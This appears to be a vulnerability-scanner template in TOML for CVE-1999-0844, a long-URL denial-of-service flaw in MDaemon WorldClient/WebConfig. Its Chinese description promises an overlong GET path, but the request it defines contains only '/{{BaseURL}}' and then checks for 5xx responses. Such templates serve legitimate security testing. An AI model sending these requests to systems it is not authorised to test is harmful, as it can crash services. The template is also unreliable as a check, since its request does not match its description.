[info]
author = "ave"
description = "MDaemon WorldClient 与 WebConfig HTTP 服务在处理超长 URL 请求时存在缓冲区溢出，远程未认证攻击者发送超长 URL 即可使服务进程崩溃造成拒绝服务。本 PoC 通过构造超长路径的 GET 请求验证目标是否存在该缺陷，发送后观察服务是否停止响应。"
id = "POC-AVE-1999-0638"
name = "CVE-1999-0844 MDaemon WorldClient/WebConfig 长 URL 拒绝服务 PoC"
severity = "medium"
tags = ["ave-1999-0638"]
vuln_id = [
    "CVE-1999-0844",
    "AVE-1999-0638",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
    504,
]
type = "status"
